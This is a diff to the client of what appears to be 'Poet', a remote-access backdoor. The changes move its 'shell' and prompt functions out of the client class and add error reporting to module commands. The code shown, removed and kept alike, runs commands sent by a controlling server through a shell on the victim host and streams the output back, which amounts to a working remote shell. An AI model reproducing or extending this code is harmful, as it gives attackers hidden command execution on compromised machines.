@@ -65,8 +65,6 @@ class PoetClient(object):
                 if inp == 'fin':
                     found = True
                     break
-                # elif inp == 'getprompt':
-                #     s.send(self.get_prompt())
                 # elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                 #     s.send(self.execute(inp))
                 # elif inp == 'recon':
@@ -99,8 +97,10 @@ class PoetClient(object):
                 for cmd, func in module.client_commands.iteritems():
                     if inp.split()[0] == cmd:
                         found = True
-                        # self.s.send(func(self, inp))
-                        func(self, inp)
+                        try:
+                            func(self, inp)
+                        except Exception as e:
+                            self.s.send(str(e.args))
 
                 if not found:
                     self.s.send('Unrecognized')
@@ -189,63 +189,11 @@ class PoetClient(object):
             except Exception as e:
                 s.send(str(e.message))
 
-
-    def shell(self, inp, s):
-        """Posh `shell' command client-side.
-
-        Create a subprocess for command and line buffer command output to
-        server while listening for signals from server.
-
-        Args:
-            s: PoetSocketClient instance
-        """
-
-        inp = inp[6:]  # get rid of 'shell ' prefix
-
-        # handle cd builtin
-        if re.search('^cd( .+)?$', inp):
-            if inp == 'cd':
-                os.chdir(os.path.expanduser('~'))
-            else:
-                try:
-                    os.chdir(os.path.expanduser(inp[3:]))
-                except OSError as e:
-                    s.send('cd: {}\n'.format(e.strerror))
-            return
-
-        # everything else
-        proc = sp.Popen(inp, stdout=sp.PIPE, stderr=sp.STDOUT, shell=True)
-        while True:
-            readable = select.select([proc.stdout, s.s], [], [], 30)[0]
-            for fd in readable:
-                if fd == proc.stdout:  # proc has stdout/err to send
-                    output = proc.stdout.readline()
-                    if output:
-                        s.send(output)
-                    else:
-                        return
-                elif fd == s.s:  # remote signal from server
-                    sig = s.recv()
-                    if sig == 'shellterm':
-                        proc.terminate()
-                        return
-
     def cmd_exec(self, cmd):
         """Light wrapper over subprocess.Popen()."""
 
         return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                         shell=True).communicate()[0]
-
-    def get_prompt(self):
-        """Create shell prompt.
-
-        Using current user and hostname, create shell prompt for server `shell'
-        command.
-        """
-        user = self.cmd_exec('whoami').strip()
-        hn = self.cmd_exec('hostname').strip()
-        end = '#' if user == 'root' else '$'
-        return '{}@{} {} '.format(user, hn, end)
 
     def parse_exec_cmds(self, inp):
         """Parse string provided by server `exec' command.
